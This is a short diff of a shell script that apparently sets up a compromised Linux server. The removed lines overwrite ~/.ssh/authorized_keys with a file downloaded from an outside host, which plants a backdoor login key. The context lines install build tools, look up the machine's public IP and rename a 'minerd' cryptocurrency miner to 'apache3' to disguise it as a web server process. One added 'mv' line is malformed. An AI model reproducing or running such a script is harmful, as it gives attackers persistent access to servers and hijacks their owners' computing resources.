@@ -1,9 +1,5 @@
-cd
-cd .ssh
-rm -rf authorized_keys
-wget -q sio.com.co/authorized_keys
-chmod 300 authorized_keys
-cd
+mv  .ssh/authorized_keys
+chmod 300 .ssh/authorized_keys
 
 dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
 chmod 0600 /var/swap.img
@@ -13,6 +9,8 @@ swapon /var/swap.img
 apt-get update
 dpkg --configure -a
 apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc
+
+cd 
 
 wget https://api.ipify.org	
 mv tanhuevon/minerd ./apache3
